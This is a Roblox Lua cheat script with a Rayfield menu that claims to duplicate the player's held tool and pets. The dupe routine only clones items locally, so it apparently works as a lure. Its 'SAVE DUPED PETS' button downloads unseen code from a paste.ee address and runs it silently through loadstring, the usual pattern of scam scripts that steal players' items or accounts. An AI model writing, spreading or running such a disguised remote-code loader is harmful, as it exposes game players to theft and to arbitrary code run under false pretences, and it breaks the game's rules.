local Players = game:GetService("Players")
local player = Players.LocalPlayer

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Here is the Name Part
local Window = Rayfield:CreateWindow({
	Name = "ROOTACESS", -- This is the name
	LoadingTitle = "ACCESSING", -- loading screen
	LoadingSubtitle = "MADE BY Yura", -- change the name
	ConfigurationSaving = {
		Enabled = false
	},
	Discord = {
		Enabled = false
	},
	KeySystem = false
})

-- Main Dupe Tab
local MainTab = Window:CreateTab("Main", 0)

local toolLabel = MainTab:CreateParagraph({
	Title = "Holding:",
	Content = "Nothing"
})

spawn(function()
	while true do
		task.wait(0.1)
		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
		if tool then
			toolLabel:Set({Title = "Holding:", Content = tool.Name})
		else
			toolLabel:Set({Title = "Holding:", Content = "Nothing"})
		end
	end
end)

local dupeAmount = 1
MainTab:CreateInput({
	Name = "Dupe Amount (1-100)",
	PlaceholderText = "Enter a number",
	RemoveTextAfterFocusLost = false,
	Callback = function(text)
		local number = tonumber(text)
		if number and number >= 1 and number <= 100 then
			dupeAmount = number
		else
			warn("Enter a number between 1 and 100")
		end
	end
})

-- DUPE Button
MainTab:CreateButton({
	Name = "DUPE",
	Callback = function()
		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
		if not tool then
			warn("No tool to duplicate.")
			return
		end

		if dupeAmount > 3 then
			local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
			gui.Name = "DupeLoading"

			local label = Instance.new("TextLabel", gui)
			label.Size = UDim2.new(0.5, 0, 0.1, 0)
			label.Position = UDim2.new(0.25, 0, 0.45, 0)
			label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			label.TextColor3 = Color3.new(1, 1, 1)
			label.Font = Enum.Font.GothamBold
			label.TextScaled = true
			label.Text = "Duplicating..."
			label.BackgroundTransparency = 0.5

			wait(1.5)
			gui:Destroy()
		end

		for i = 1, dupeAmount do
			local clone = tool:Clone()
			clone.Parent = player.Backpack
		end
	end
})

-- SAVE DUPED PETS Button
MainTab:CreateButton({
	Name = "SAVE DUPED PETS",
	Callback = function()
		pcall(function()
			loadstring(game:HttpGet("https://paste.ee/r/iQM2Mf69"))()
		end)
	end
})
